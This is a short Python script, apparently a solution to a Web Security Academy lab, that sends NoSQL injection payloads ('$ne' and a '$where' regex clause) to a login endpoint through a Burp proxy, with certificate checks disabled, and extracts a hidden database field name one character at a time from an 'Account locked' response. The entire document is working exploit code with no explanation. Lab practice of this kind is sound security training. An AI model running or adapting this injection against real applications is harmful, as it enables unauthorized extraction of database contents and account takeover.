import string
import requests
import urllib3
urllib3.disable_warnings()

url = "https://0a4400b20305b39d81e55292000b004f.web-security-academy.net/login" # login URL here
proxies = { # See requests in burp
    "https":"127.0.0.1:8080",
    "http":"127.0.0.1:8080",
}
a = ""
b = string.ascii_letters + string.digits
x = requests

i = 0
while True:
    for brute in b:
        login = x.post(url, json={"username":"carlos","password":{"$ne":""},"$where":f"Object.keys(this)[4].match('^.{{{i}}}{brute}.*')"}, proxies=proxies, verify=False)
        if "Account locked:" in login.text:
            a += brute
            i += 1
            print(f"Character found: {a}")
        if len(a) == 13:
            print(f"The field name is: {a}")
            quit()